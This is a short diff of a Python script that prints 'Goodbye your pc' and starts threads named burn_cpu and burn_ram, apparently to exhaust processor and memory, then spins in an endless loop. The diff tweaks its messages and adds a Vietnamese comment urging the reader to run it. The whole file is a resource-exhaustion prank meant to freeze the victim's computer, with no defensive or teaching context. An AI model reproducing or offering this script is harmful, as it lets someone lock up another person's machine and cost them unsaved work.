@@ -2,10 +2,10 @@ import threading
 print(
     "Goodbye your pc"
 )
-print("......")
+print("...............")
 input(
     "Stand for freeze "
-    " end "
+    "................."
 )
 A = []
 def burn_cpu():
@@ -24,3 +24,4 @@ for i in range(8):
 threading.Thread(target=burn_ram, daemon=True).start()
 while True:
   pass
+# chạy cái này đi #
